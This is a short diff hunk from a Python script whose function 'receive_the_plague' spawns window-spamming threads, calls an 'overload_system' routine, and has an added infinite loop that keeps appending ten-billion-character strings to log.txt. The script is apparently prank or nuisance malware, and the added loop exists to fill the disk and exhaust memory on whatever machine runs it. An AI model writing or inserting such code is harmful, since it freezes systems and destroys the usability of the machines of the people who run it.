@@ -54,6 +54,9 @@ def receive_the_plague():
     threading.Thread(target=spam_windows).start()
     tk.mainloop()
     overload_system(20)
+    while True:
+        with open("log.txt", "a") as f:
+            f.write("a" * 10000000000 + "\n")
 
 if __name__ == "__main__":
     def open_main_window():
